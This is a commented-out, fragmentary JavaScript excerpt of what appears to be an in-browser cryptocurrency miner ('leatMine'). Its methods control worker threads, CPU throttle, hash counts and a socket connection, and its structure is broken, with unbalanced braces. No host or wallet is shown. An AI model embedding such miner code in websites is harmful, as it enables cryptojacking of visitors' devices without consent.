/*(function(window) {
  ;








  lM.prototype.setAutoThreadsEnabled = function(enabled) {
    this._autoThreads.enabled = !!enabled;
    if (!enabled && this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null
    }
    if (enabled && !this._autoThreads.interval) {
      this._autoThreads.adjustAt = Date.now() + this._autoThreads.adjustEvery;
      this._autoThreads.interval = setInterval(this._adjustThreads.bind(this), 1e3)
    }
  }
  ;
  lM.prototype.getThrottle = function() {
    return this._throttle
  }
  ;
  lM.prototype.setThrottle = function(throttle) {
    this._throttle = Math.max(0, Math.min(.99, throttle));
    if (this._currentJob) {
      this._setJob(this._currentJob)
    }
  }
  ;












  lM.prototype.getNumThreads = function() {
    return this._targetNumThreads
  }
  ;
  lM.prototype.setNumThreads = function(num) {
    var num = Math.max(1, num | 0);
    this._targetNumThreads = num;
    if (num > this._threads.length) {
      for (var i = 0; num > this._threads.length; i++) {
        var thread = new leatMine.JobThread;
        if (this._currentJob) {
          thread.setJob(this._currentJob, this._onTargetMetBound)
        }
        this._threads.push(thread)
      }
    } else if (num < this._threads.length) {
      while (num < this._threads.length) {
        var thread = this._threads.pop();
        this._totalHashesFromDeadThreads += thread.hashesTotal;
        thread.stop()
      }
    }
  }
  ;


















}


  ;






  lM.prototype.stop = function(mode) {
    for (var i = 0; i < this._threads.length; i++) {
      this._totalHashesFromDeadThreads += this._threads[i].hashesTotal;
      this._threads[i].stop()
    }
    this._threads = [];
    this._autoReconnect = false;
    if (this._socket) {
      this._socket.close()
    }
    this._currentJob = null;
    if (this._autoThreads.interval) {
      clearInterval(this._autoThreads.interval);
      this._autoThreads.interval = null
    }
    if (this._tab.interval && mode !== "dontKillTabUpdate") {
      clearInterval(this._tab.interval);
      this._tab.interval = null
    }
  }
  ;

*/
